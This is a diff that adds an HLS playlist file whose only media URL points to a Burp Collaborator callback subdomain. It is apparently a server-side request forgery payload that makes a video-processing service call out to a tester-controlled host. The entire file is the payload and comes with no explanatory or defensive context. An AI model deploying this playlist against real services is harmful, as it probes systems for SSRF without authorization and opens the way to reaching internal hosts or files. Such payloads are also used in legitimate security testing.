@@ -1,0 +1,6 @@
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+http://NN.hwhmv55yv88laswgdaymx52nhen7lva.burpcollaborator.net/example.mp4
+##prevent cache: 0.182801454805
+#EXT-X-ENDLIST
